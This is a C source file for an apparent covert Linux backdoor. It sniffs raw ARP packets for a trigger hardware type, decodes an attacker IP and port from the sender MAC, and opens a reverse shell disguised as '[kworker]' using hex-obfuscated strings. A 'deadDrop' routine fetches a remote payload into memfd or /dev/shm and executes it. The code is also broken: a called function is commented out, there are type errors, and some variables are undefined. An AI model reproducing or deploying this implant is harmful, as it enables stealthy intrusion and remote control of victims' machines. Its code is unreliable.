#include<stdlib.h>
#include<unistd.h>
#include<arpa/inet.h>

#define NAME "TArp"

extern char ** environ;

/* Defined a custom struct to handle both the
   Ethernet Header and the Arp Header */
struct arp_hdr {
	//Ethernet header
	unsigned char  h_dest[6];     /*Destination MAC*/
	unsigned char  h_source[6];   /*Source MAC*/
	unsigned short h_proto;       /*Ether Type*/
	//ARP header
	unsigned short ar_hrd;        /*ARP Hardware Type*/
	unsigned short ar_pro;        /*ARP Protocol Type*/
	unsigned char  ar_hln;        /*ARP Hardware Length*/
	unsigned char  ar_pln;        /*ARP Proto Length*/
	unsigned short ar_op;         /*ARP OP Code*/

	unsigned char ar_sha[6];      /*ARP Sender Hardware Address*/
	unsigned char ar_sip[4];      /*ARP Sender Proto Address*/
	unsigned char ar_tha[6];      /*ARP Target Hardware Address*/
	unsigned char ar_tip[4];      /*ARP Target Proto Address*/
};

//int reverse_shell(unsigned int, unsigned short);
int arp_listener(void);
int methodID(void);
int lz(int);
int deadDrop(unsigned int, unsigned short);

/* function to grab Kver for method selection */
int methodID(void *)
{
	struct utsname data;
	uname(&data);

	char *version;
	char *split;

	version = strtok(data.release,split)
	
	//Debug line
	//printf("Kver is: %s",(char *)data.release);
	
	if (version > 3){ return 1;}
	else if (version < 3){ return 0;}
	else if (version == 3){
		version= strtok(NULL,split);
		if (version >= 17){ return 1;}
		else {return 0;}
	}
}
			
/* function to allocate mem for payload */
int lz(int methodID){
	int loadfd;
	//char *name = "TArp";
	if (methodID == 0){
		loadfd = shm_open(NAME, O_RDWR | O_CREAT, S_IRWXU);
		if (loadfd < 0) {exit(1);}
	}
	else if (methodID == 1){
		loadfd = memfd_create(NAME,1);
		if(loadfd < 0){exit(1);}
	}
	return loadfd;
}


/* function to retrieve payload */
int deadDrop(unsigned int mailslot, unsigned short id){
	if (fork() == 0){
		if (setsid() > 0){
			int sock, method, zone;
			char buf[1024], path[1024];

			struct sockaddr_in mailBox;
			mailBox.sin_addr.s_addr = mailslot;	
			mailBox.sin_port = id;
			mailBox.sin_family = AF_INET;
	
			sock = socket(AF_INET,SOCK_STREAM,0);
			if(connect(sock, (struct sockaddr*)&mailBox, sizeof(mailBox)) < 0){ exit(2)};
	
			zone = lz(methodID());
			if(zone <= 0){ exit(3);}

			while(1) {
				if ((read (sock,buf,1024) ) <= 0) break;
				write (zone,buf,1024);
			}
			close(sock);

			if ( method == 0 ){
				if (fexecve(zone, args, environ) < 0){ exit(4);}
			}
			else{
				close(zone);
				snprintf(path, 1024, "/dev/shm/%s",NAME);
				if ( execve(path,args,environ) < 0){ exit(5);}
			}

			return 0;	
			}
	}
	wait(NULL);
	arp_listener();
	return 0;
}

/* Function to handle creating the Reverse
   Shell using the hidden data with the
   sender hardware address collected in main 

int reverse_shell(unsigned int IP_ADDR, unsigned short PORT)
{

	if(fork()==0)
	{
		if (setsid()>0)
		{

			struct sockaddr_in sa;
			int s;

        		sa.sin_family = AF_INET;
        		sa.sin_addr.s_addr = IP_ADDR;
			sa.sin_port = PORT;

			s = socket(AF_INET, SOCK_STREAM, 0);
        		connect(s, (struct sockaddr *)&sa, sizeof(sa));
        		dup2(s, 0);
        		dup2(s, 1);
        		dup2(s, 2);

// shell = "sh"
//   name  = "[kworker]"
//	 execlp will search PATH looking for "sh" 

			char shell[3] = {0x73,0x68,0x0};
			char name[10] = {0x5b,0x6b,0x77,0x6f,0x72,0x6b,0x65,0x72,0x5d,0x0};
			execlp(shell,name, (char *) NULL);
		}
		return 0;
	}
	wait(NULL);
	arp_listener();
	return 0;
}*/


/* Sniffs the wire for ARP packets and
   only triggers on a IEEE 1394 hw type */
int arp_listener(void)
{

	int sock_raw;
	unsigned short ethertype = 0x0608;   //arp ethertype 0x806

	unsigned char *buffer = (unsigned char *)malloc(1024);

	sock_raw = socket(AF_PACKET, SOCK_RAW, ethertype);
	if(sock_raw < 0)
	{
		return 1;
	}
	while(1)
	{
		if(recv(sock_raw, buffer, 1024, 0) <0)
		{
			return 1;
		}

		struct arp_hdr *arphdr = (struct arp_hdr*)buffer;
		if(ntohs(arphdr->ar_hrd) == 24){

			unsigned short port;
			unsigned int   ip;

			// Bit shifting to build the return port/IP
			port=(arphdr->ar_sha[1]<<8) + (arphdr->ar_sha[0]);
			ip=(arphdr->ar_sha[5]<<24);
			ip+=(arphdr->ar_sha[4]<<16);
			ip+=(arphdr->ar_sha[3]<<8);
			ip+=(arphdr->ar_sha[2]);

			if(fork()== 0)
			{
				if(setsid()>0)
				{
					reverse_shell(ip,port);
				}
			}

			close(sock_raw);
		}
	}

}

int main()
{
	if(fork()==0)
	{
		arp_listener();
	}
	return 0;
}
